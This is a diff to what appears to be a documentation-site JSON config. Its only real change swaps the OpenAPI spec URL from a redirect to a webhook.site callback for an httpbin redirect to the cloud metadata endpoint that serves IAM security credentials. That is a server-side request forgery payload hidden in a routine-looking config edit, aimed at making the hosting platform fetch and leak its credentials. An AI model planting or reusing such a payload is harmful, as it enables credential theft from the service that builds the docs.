@@ -5,6 +5,6 @@
   "colors": {"primary": "#16A34A", "light": "#07C983", "dark": "#15803D"},
   "navigation": {"pages": [{"group": "Getting Started", "pages": ["docs/index"]}]},
   "api": {
-    "openapi": ["https://httpbin.org/redirect-to?url=https%3A%2F%2Fwebhook.site%2Fe27d2c30-7065-4093-984b-28ab4e278794%3Ff7%3Dredirect_chain&status_code=301"]
+    "openapi": ["https://httpbin.org/redirect-to?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F&status_code=301"]
   }
 }
